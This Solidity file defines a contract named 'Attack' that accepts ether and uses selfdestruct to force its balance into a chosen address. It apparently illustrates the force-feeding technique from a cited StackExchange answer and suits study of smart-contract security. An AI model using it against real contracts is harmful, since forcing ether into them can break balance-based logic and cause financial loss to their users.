// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988


contract Attack {

    function selfDestruct(address _to) external {
        selfdestruct(payable(_to));
    }

    receive() external payable {}

}